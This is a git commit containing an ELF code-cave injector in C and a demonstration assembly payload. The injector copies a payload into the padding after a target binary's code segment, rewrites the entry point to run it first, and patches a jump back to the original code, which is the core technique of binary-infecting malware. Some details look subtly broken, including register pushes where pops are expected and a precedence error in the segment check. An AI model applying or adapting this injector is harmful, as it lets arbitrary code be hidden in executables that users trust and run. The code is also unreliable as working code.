475f59108da1f256a1ecf752066d123ee7c71652
Joel Clingempeel <joel.clingempeel@gmail.com>
2021-11-26 14:15:44 -0500

    First commit.

---
+++ elfmod.c
@@ -0,0 +1,123 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <elf.h>
+#include <sys/mman.h>
+
+#define PLACEHOLDER_BYTE 0x11
+#define BACKWARD_JUMP_VALUE 43
+
+
+int open_map_elf(char* filename, uint8_t** data) {
+  int fd, size;
+
+  if ((fd = open(filename, O_RDWR)) < 0) {
+    perror("Opening file");
+    exit(1);
+  }
+
+  size = lseek(fd, 0, SEEK_END);
+
+  *data = mmap(0, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
+
+  return fd;
+}
+
+Elf64_Shdr* find_elf64_sections (uint8_t* data, char* name) {
+  Elf64_Ehdr *ehdr = (Elf64_Ehdr*)data;
+  Elf64_Shdr *shdr = (Elf64_Shdr*)(data + ehdr->e_shoff);
+  
+  char* sname;
+  const char* sh_strtab_p = data + shdr[ehdr->e_shstrndx].sh_offset;
+  int section_idx;
+  for (int i = 0; i < ehdr->e_shnum; i++) {
+    sname = (char*)(sh_strtab_p + shdr[i].sh_name);
+    if (!strcmp(name, sname)) {
+      printf("Found %s at section %d\n", name, i);
+      return &shdr[i];
+    }
+  }
+  perror("Cannot find elf section");
+  exit(1);
+}
+
+int find_code_segment (uint8_t* data) {
+  Elf64_Ehdr *ehdr = (Elf64_Ehdr*)data;
+  Elf64_Phdr *phdr = (Elf64_Phdr*)(data + ehdr->e_phoff);
+  
+  int text_idx;
+  for (int i = 0; i < ehdr->e_phnum; i++) {
+    if (phdr[i].p_flags & 5 == 5 && phdr[i].p_type == PT_LOAD) {
+      printf("Code segment found at %d\n", i);
+      return i;
+    }
+  }
+  perror("Cannot find code segment");
+  exit(1);
+}
+
+short int* find_placeholder(uint8_t* byte) {
+  while (*byte != PLACEHOLDER_BYTE)
+    byte += 1;
+  return (short int*)byte;
+}
+
+int main(int argc, char* argv[]) {
+  int target_fd, payload_fd;
+  uint8_t *target_data, *payload_data;
+
+  if (argc != 3) {
+    printf("Usage: %s <src> <payload>\n", argv[0]);
+    return 0;
+  }
+
+  target_fd = open_map_elf(argv[1], &target_data);
+  payload_fd = open_map_elf(argv[2], &payload_data);
+
+  // Find code cave for target binary.
+  printf("Analyzing target:\n");
+  Elf64_Ehdr* ehdr = (Elf64_Ehdr*)target_data;
+  Elf64_Shdr* shdr = (Elf64_Shdr*)(target_data + ehdr->e_shoff);
+  Elf64_Phdr *phdr = (Elf64_Phdr*)(target_data + ehdr->e_phoff);
+
+  int code_idx = find_code_segment(target_data);
+  int code_end_offset = phdr[code_idx].p_offset + phdr[code_idx].p_filesz;
+  int gap_size = phdr[code_idx + 1].p_offset - code_end_offset;
+  printf("Code End Offset:  0x%x\nGap size:  0x%x\n", code_end_offset, gap_size);
+  uint8_t* code_cave = target_data + code_end_offset;
+
+  // Locate relevant code in payload binary.
+  printf("\nAnalyzing payload:\n");
+  int payload_size;
+  uint8_t* payload_code;
+  Elf64_Shdr* payload_text_shdr = find_elf64_sections(payload_data, ".text");
+  payload_size = payload_text_shdr->sh_size;
+  printf("Payload size:  0x%x\n", payload_size);
+  if (payload_size > gap_size) {
+    perror("Payload won't fit");
+    exit(1);
+  }
+
+  payload_code = payload_data + payload_text_shdr->sh_offset;
+
+  // Copy payload to code cave.
+  memmove(code_cave, payload_code, payload_size);
+
+  // Adjust entry point to point to code cave.
+  printf("\nEntry: %ld Code End: %d\n", ehdr->e_entry, code_end_offset);
+  int dist_to_end = code_end_offset - ehdr->e_entry;
+  printf("Dist to end %d\n", dist_to_end);
+  ehdr->e_entry = code_end_offset;
+
+  // Patch relative jump to revert control flow to original entry.
+  short int* place = find_placeholder(code_cave);
+  *place = dist_to_end + BACKWARD_JUMP_VALUE;
+  printf("Placeholder patched with %hu\n", *place);
+
+  close(target_fd);
+  close(payload_fd);
+
+  return 0;
+}
---
+++ payload.s
@@ -0,0 +1,23 @@
+        .global _start
+        .text
+_start:
+	push	%rax
+	push	%rdi
+	push	%rsi
+	push	%rdx
+	mov     $1, %rax
+        mov     $1, %rdi
+	lea	(%rip), %rsi
+	add	$34, %rsi
+        mov     $36, %rdx
+        syscall
+	push	%rax
+	push	%rdi
+	push	%rsi
+	push	%rdx
+	lea	(%rip), %r10
+	sub	$0x1111, %r10  # Patch 0x111 with computed offset
+	jmp	%r10
+
+msg:
+        .ascii  "Muahahaha - file has been hijacked\n"
